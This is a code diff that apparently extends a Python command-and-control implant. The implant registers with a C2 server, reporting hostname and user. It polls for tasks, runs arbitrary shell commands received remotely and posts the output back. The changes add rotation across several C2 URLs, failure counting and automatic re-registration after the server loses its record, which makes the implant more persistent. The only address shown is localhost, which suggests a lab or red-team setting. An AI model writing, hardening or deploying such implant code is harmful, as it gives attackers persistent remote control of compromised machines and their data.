@@ -21,7 +21,7 @@ import uuid
 import requests
 
 
-C2_URL = "https://localhost:9443"
+C2_URLS = ["https://localhost:9443"]
 
 # mTLS: implant presents its client cert, verifies C2 against the shared CA.
 _DIR        = os.path.dirname(os.path.abspath(__file__))
@@ -67,14 +67,15 @@ def _sleep():
 ## Handlers
 
 def handle_execute(task):
+    cmd_str = task.get("command", "").strip()
     try:
-        command = shlex.split(task["command"].strip())
+        command = shlex.split(cmd_str)
         res = subprocess.run(command, capture_output=True, text=True, timeout=120)
-        return {"ok": True, "output": res.stdout + res.stderr}
+        return {"ok": True, "output": res.stdout + res.stderr, "command": cmd_str}
     except subprocess.TimeoutExpired:
-        return {"ok": False, "error": "Command timed out (120s)"}
+        return {"ok": False, "error": "Command timed out (120s)", "command": cmd_str}
     except OSError as e:
-        return {"ok": False, "error": str(e)}
+        return {"ok": False, "error": str(e), "command": cmd_str}
 
 
 def handle_upload(task):
@@ -109,9 +110,12 @@ HANDLERS = {
     "set_interval": handle_set_interval,
 }
 
-# Register with the C2 server
-def register(session):
-    resp = session.post(f"{C2_URL}/{ENDPOINT['register']}", json={
+# How many consecutive beacon failures before we rotate to the next C2 URL.
+MAX_FAILURES_BEFORE_ROTATE = 3
+
+
+def register(session, base_url):
+    resp = session.post(f"{base_url}/{ENDPOINT['register']}", json={
         "id":       IMPLANT_ID,
         "hostname": platform.node(),
         "user":     os.getenv("USER", "unknown"),
@@ -123,23 +127,41 @@ def register(session):
 
 def beacon_loop():
     session = _session()
-
-    # Keep trying to register until the C2 is reachable.
-    while True:
-        try:
-            implant_id = register(session)
-            break
-        except (requests.exceptions.ConnectionError, requests.exceptions.HTTPError):
-            _sleep()
+    c2_index = 0
+    consecutive_failures = 0
+    implant_id = None
 
     while True:
+        base_url = C2_URLS[c2_index % len(C2_URLS)]
+
+        if implant_id is None:
+            try:
+                implant_id = register(session, base_url)
+                consecutive_failures = 0
+            except (requests.exceptions.ConnectionError,
+                    requests.exceptions.HTTPError):
+                consecutive_failures += 1
+                if len(C2_URLS) > 1 and consecutive_failures >= MAX_FAILURES_BEFORE_ROTATE:
+                    c2_index += 1
+                    consecutive_failures = 0
+                _sleep()
+            continue  # re-check registration before beaconing
+
         try:
-            # Poll for a task
-            resp = session.get(f"{C2_URL}/{ENDPOINT['tasks']}/{implant_id}", timeout=10)
+            resp = session.get(
+                f"{base_url}/{ENDPOINT['tasks']}/{implant_id}", timeout=10
+            )
+
+            if resp.status_code == 404:
+                # C2 restarted and lost our record... Re-register immediately
+                implant_id = None # Start re-registration
+                consecutive_failures = 0
+                continue
+
             resp.raise_for_status()
-            body = resp.json()
+            consecutive_failures = 0
 
-            task = body.get("task")
+            task = resp.json().get("task")
             if task:
                 task_type = task.get("type", "unknown")
                 handler = HANDLERS.get(task_type)
@@ -147,18 +169,23 @@ def beacon_loop():
                     result = handler(task)
                 else:
                     result = {"ok": False, "error": f"Unknown task type: {task_type}"}
-
+                
                 result["task_id"] = task.get("task_id")
-                result["type"] = task_type
+                result["type"]    = task_type
 
                 session.post(
-                    f"{C2_URL}/{ENDPOINT['results']}/{implant_id}",
+                    f"{base_url}/{ENDPOINT['results']}/{implant_id}",
                     json=result,
                     timeout=10,
                 )
 
         except requests.exceptions.ConnectionError:
-            pass  # C2 is down. Silently retrying next interval
+            consecutive_failures += 1
+            if len(C2_URLS) > 1 and consecutive_failures >= MAX_FAILURES_BEFORE_ROTATE:
+                c2_index += 1
+                consecutive_failures = 0
+                implant_id = None  # re-register with next C2
+
         except requests.exceptions.RequestException:
             pass
 
